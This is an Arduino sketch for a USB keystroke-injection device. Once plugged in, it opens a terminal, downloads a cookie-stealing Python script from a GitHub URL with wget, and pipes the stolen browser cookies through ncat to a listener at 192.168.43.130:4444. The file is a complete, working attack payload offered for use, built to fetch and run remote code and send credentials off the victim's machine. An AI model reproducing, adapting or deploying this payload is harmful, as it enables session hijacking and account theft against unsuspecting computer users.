#include <Keyboard.h>
//breadboard banter
//int BUTTON = 4;


void popthatShell() {
  Keyboard.press(KEY_LEFT_ALT);
  delay(200);
  Keyboard.press(KEY_F1);
  delay(200);
  Keyboard.releaseAll();
  delay(100);
  Keyboard.println("terminal");
  delay(200);
  Keyboard.press(KEY_LEFT_CTRL);
  delay(200);
  Keyboard.press(KEY_LEFT_SHIFT);
  delay(200);
  Keyboard.press('n');
  delay(200);
  Keyboard.releaseAll();
  delay(200);
  Keyboard.print("cd ");
  delay(100);
  Keyboard.press(KEY_LEFT_SHIFT);
  delay(200);
  Keyboard.press('`');
  delay(200);
  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.releaseAll();
  delay(200);
}
//Had to redo print cause nothing works :)
void newPrint(String URL) {
  char temp[URL.length()+1];
  URL.toCharArray(temp, URL.length()+1);
  for (int i = 0; i < URL.length(); i++) {
    if (temp[i] == ':'){
      Keyboard.press(KEY_LEFT_SHIFT);
      delay(50);
      Keyboard.press(';');
      delay(50);
      Keyboard.releaseAll();

    }else if (temp[i] == '?'){
      Keyboard.press(KEY_LEFT_SHIFT);
      delay(50);
      Keyboard.press('/');
      delay(50);
      Keyboard.releaseAll();
    }else if (temp[i] == '&'){
      Keyboard.press(KEY_LEFT_SHIFT);
      delay(50);
      Keyboard.press('7');
      delay(50);
      Keyboard.releaseAll();
    }else if (temp[i] == '|'){
      Keyboard.press(KEY_LEFT_SHIFT);
      delay(50);
      Keyboard.press('\\');
      delay(50);
      Keyboard.releaseAll();
    }else if (temp[i] == '('){
      Keyboard.press(KEY_LEFT_SHIFT);
      delay(50);
      Keyboard.press('9');
      delay(50);
      Keyboard.releaseAll();
   }else if (temp[i] == ')'){
      Keyboard.press(KEY_LEFT_SHIFT);
      delay(50);
      Keyboard.press('0');
      delay(50);
      Keyboard.releaseAll();
   }else if (temp[i] == '}'){
      Keyboard.press(KEY_LEFT_SHIFT);
      delay(50);
      Keyboard.press(']');
      delay(50);
      Keyboard.releaseAll();
   }else if (temp[i] == '{'){
      Keyboard.press(KEY_LEFT_SHIFT);
      delay(50);
      Keyboard.press('[');
      delay(50);
      Keyboard.releaseAll();
    }else if (temp[i] >= 'A'  && temp[i] <= 'Z'){
      Keyboard.press(KEY_LEFT_SHIFT);
      delay(20);
      Keyboard.press(temp[i]);
      delay(20);
      Keyboard.releaseAll();
    }else{
      Keyboard.releaseAll();
      delay(20);
      Keyboard.print(URL[i]);
    }
  }
  Keyboard.press(KEY_RETURN);
  delay(80);
  Keyboard.releaseAll();

}

void payload4 () {

  popthatShell();
  newPrint("wget -O script.py https://raw.githubusercontent.com/Josh-Murray/chromeCookie/master/cookieStealer.py?token=AJ4THAU3OXJD3WRTXLCYGSK5IDZCM ");
  delay(1000);
  newPrint("python3 script.py | ncat 192.168.43.130 4444");

}
void setup() {
  Keyboard.begin();
  delay(400);
  payload4();
}


void loop() {
  // put your main code here, to run repeatedly:

}
